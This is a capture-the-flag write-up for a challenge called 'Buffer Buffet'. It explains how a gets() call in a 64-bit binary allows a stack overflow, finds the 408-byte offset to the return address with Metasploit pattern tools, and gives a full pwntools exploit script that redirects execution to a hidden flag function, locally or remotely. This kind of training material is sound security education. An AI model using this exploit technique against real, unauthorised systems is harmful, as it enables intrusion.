# Buffer Buffet

Writeup Author: Nguyen Nghia Hiep
## Description
```
As an elite hacker invited to an exclusive digital banquet, you must navigate through the layers of a complex software system. Among the appetizers, main course, and dessert lies a hidden entry point that, when discovered, reveals a treasure trove of sensitive information.

Author: @Inv1s1bl3

nc 34.125.199.248 4056
```
## Writeup
We are given the binary ./vuln, vuln is an ELF64 binary file. Running the binary, user input is asked and is returned.
```bash
$ ./vuln                                                           
Enter some text:
hello
You entered: hello
```
Here I attempted to run Ghidra to decompile the binary and look for interesting functions, this process can also be done on GDB (using the command info functions).

Here we found the main() function, and it is calling vuln() function. In vuln() we can see that the code is prompting the user for input using gets() (which is dangerous as it does not check for buffer size of user input) and is storing in local_198 which has capacity for 400 bytes.

This outlines a buffer overflow vulnerability. Here we also discover an interesting secretFunction() function which will display the flag.

If we can overflow the input buffer and inject address to secretFunction() to the rip register, we can display the flag. First, I locate the offset to the rip register. Using metasploit tools I created a pattern to put in my buffer (length of 450 bytes which is 50 bytes longer than what the input can store).
```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 450
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9
```

As expected a segmentation fault is shown, viewing the registers, in particular the rip register.

rbp has been overflow with our input (convert hex value to ascii and we'll see part of our input); rip has also been overflow (it now contains our stored at rip register). Now we can locate the offset.
```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 450 -q 6e41376e41366e41 
[*] Exact match at offset 408
```
The offset is located at the 408 byte. A python exploit script can be created.
```python
# Author: Nguyen Nghia Hiep

import pwn
import argparse

# Add command line arguments to our exploit script
parser = argparse.ArgumentParser()
parser.add_argument("choice", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)

args = parser.parse_args()

elf = pwn.ELF("./vuln")

# Buffer overflow at 400 bytes

# Test offset at 408 bytes
# secretFunction() address retrieved from ELF symbol table
new_rip =  pwn.p64(elf.symbols["secretFunction"])

# After the secretFunction() is called set return address to main (just to make the program execute flawlessly).
return_main = pwn.p64(elf.symbols["main"])

payload = b"".join(
        [
            b"A" * 408,
            new_rip,
            return_main,
        ]
    )

payload += b"\n"

if args.choice == "local":
    p = elf.process()

elif args.choice == "remote":
    if not args.target or not args.port:
        pwn.warning("Supply -t <target> and -p <port>")
        exit()
    p = pwn.remote(args.target, args.port)

p.sendline(payload)
p.interactive()
```
Running the exploit script the flag can be obtained!

## References
